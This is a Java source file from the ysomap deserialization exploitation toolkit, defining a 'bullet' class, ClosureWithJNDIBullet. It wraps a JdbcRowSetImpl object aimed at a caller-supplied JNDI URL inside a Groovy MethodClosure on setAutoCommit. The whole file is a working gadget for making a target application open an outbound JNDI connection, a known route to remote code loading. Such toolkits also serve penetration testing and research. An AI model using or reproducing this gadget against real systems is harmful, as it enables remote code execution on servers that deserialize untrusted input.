package ysomap.bullets.groovy;

import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.JdbcRowSetImplBullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Bullets
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Details("向外发起JNDI连接")
@Targets({Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class ClosureWithJNDIBullet extends AbstractBullet<Object> {
    @NotNull
    @Require(name = "jndiURL", detail = "jndiURL")
    public String jndiURL = null;

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = JdbcRowSetImplBullet.newInstance(jndiURL);
        return new MethodClosure(bullet.getObject(), "setAutoCommit");
    }

    public static ClosureWithJNDIBullet newInstance(Object... args) throws Exception {
        ClosureWithJNDIBullet bullet = new ClosureWithJNDIBullet();
        bullet.set("jndiURL", args[0]);
        return bullet;
    }
}
